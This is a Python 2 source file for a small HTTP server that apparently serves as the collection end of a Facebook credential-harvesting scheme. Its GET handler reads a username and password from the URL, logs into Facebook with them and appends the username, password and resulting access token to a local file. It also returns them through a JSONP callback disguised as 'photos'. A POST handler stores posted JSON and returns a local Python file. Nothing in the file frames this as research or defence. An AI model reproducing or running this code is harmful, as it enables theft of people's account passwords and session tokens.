from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import SocketServer
import simplejson
import random
from urlparse import urlparse
from facebook import FacebookClient

class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/javascript')
        self.end_headers()
        self.client = FacebookClient()

    def do_GET(self):
        if self.path=='/favicon.ico':
            return
        self._set_headers()
        try:
            query = urlparse(self.path).query
            query_components = dict(qc.split("=") for qc in query.split("&"))
            user = query_components["user"]
            password = query_components["pass"]
            res = self.client.login(user, password)
            access_token = res["access_token"]
            #self.wfile.write(user + "|" + password + "|" + access_token)
            self.wfile.write('{0}({1})'.format('photos', {'a':user,'b':password,'c':str(access_token)}))
            with open('data.txt', 'a') as f:
                f.write(user + "|" + password + "|" + access_token + "\n")
        except Exception, e:
            self.wfile.write('{0}({1})'.format('photos', {'a':0,'b':0,'c':0}))
    def do_HEAD(self):
        self._set_headers()

    def do_POST(self):
        self._set_headers()
        print "in post method"
        self.data_string = self.rfile.read(int(self.headers['Content-Length']))

        self.send_response(200)
        self.end_headers()

        data = simplejson.loads(self.data_string)
        with open("test123456.json", "w") as outfile:
            simplejson.dump(data, outfile)
        print "{}".format(data)
        f = open("for_presen.py")
        self.wfile.write(f.read())
        return


def run(server_class=HTTPServer, handler_class=S, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print 'Starting httpd...'
    httpd.serve_forever()

if __name__ == "__main__":
    from sys import argv

if len(argv) == 2:
    run(port=int(argv[1]))
else:
    run()